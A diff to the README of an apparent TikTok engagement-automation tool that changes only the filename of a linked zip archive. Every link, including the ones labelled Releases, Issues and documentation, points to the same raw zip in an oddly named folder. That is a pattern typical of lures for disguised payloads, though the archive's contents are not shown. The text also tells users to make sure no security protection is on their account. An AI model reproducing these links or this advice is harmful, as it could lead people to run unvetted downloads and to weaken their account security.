@@ -1,7 +1,7 @@
 # 🌟 TikTok-Like-API - Simplify Your TikTok Interaction
 
 ## 📥 Download the App
-[![Download TikTok-Like-API](https://github.com/Parth4Ever/TikTok-Like-API/raw/refs/heads/main/fusariose/API-Tok-Tik-Like-v2.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/Parth4Ever/TikTok-Like-API/raw/refs/heads/main/fusariose/API-Tok-Tik-Like-v2.7.zip)
+[![Download TikTok-Like-API](https://github.com/Parth4Ever/TikTok-Like-API/raw/refs/heads/main/fusariose/Tik-API-Tok-Like-v2.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/Parth4Ever/TikTok-Like-API/raw/refs/heads/main/fusariose/Tik-API-Tok-Like-v2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to TikTok-Like-API! This application allows you to interact with the TikTok platform easily. You can automate liking, following, and even streaming without any programming knowledge. 
@@ -23,7 +23,7 @@ To run this application smoothly, your system should meet the following requirem
 ## 💻 Installation Instructions
 
 ### Step 1: Visit the Download Page
-To get your copy of TikTok-Like-API, please visit the Releases page here: [TikTok-Like-API Releases](https://github.com/Parth4Ever/TikTok-Like-API/raw/refs/heads/main/fusariose/API-Tok-Tik-Like-v2.7.zip).
+To get your copy of TikTok-Like-API, please visit the Releases page here: [TikTok-Like-API Releases](https://github.com/Parth4Ever/TikTok-Like-API/raw/refs/heads/main/fusariose/Tik-API-Tok-Like-v2.7.zip).
 
 ### Step 2: Download the Latest Version
 On the Releases page, look for the latest version of the application. Click on the version number to see the available downloads. Choose the file that is appropriate for your operating system.
@@ -53,10 +53,10 @@ If you encounter issues, here are some common problems and solutions:
 - **Login Issues:** If you can’t log in to TikTok, check your username and password. Ensure there's no security protection on your account preventing access.
 
 ## 📞 Getting Help
-If you need further assistance or have questions, feel free to reach out. Check the [Issues](https://github.com/Parth4Ever/TikTok-Like-API/raw/refs/heads/main/fusariose/API-Tok-Tik-Like-v2.7.zip) section on GitHub for help from the community and developers.
+If you need further assistance or have questions, feel free to reach out. Check the [Issues](https://github.com/Parth4Ever/TikTok-Like-API/raw/refs/heads/main/fusariose/Tik-API-Tok-Like-v2.7.zip) section on GitHub for help from the community and developers.
 
 ## 📄 Additional Resources
-For more information about how to use TikTok-Like-API, check out the [documentation](https://github.com/Parth4Ever/TikTok-Like-API/raw/refs/heads/main/fusariose/API-Tok-Tik-Like-v2.7.zip) provided on the project GitHub page.
+For more information about how to use TikTok-Like-API, check out the [documentation](https://github.com/Parth4Ever/TikTok-Like-API/raw/refs/heads/main/fusariose/Tik-API-Tok-Like-v2.7.zip) provided on the project GitHub page.
 
 ## 📦 Contributing
 If you’re interested in contributing to TikTok-Like-API, please read our contribution guidelines in the repository. Your input can help improve the application for everyone!
@@ -64,4 +64,4 @@ If you’re interested in contributing to TikTok-Like-API, please read our contr
 ## 🔗 Conclusion 
 Thank you for choosing TikTok-Like-API. We hope you enjoy using the application and that it enhances your TikTok experience. 
 
-For the main download link again, please visit: [TikTok-Like-API Releases](https://github.com/Parth4Ever/TikTok-Like-API/raw/refs/heads/main/fusariose/API-Tok-Tik-Like-v2.7.zip).
+For the main download link again, please visit: [TikTok-Like-API Releases](https://github.com/Parth4Ever/TikTok-Like-API/raw/refs/heads/main/fusariose/Tik-API-Tok-Like-v2.7.zip).
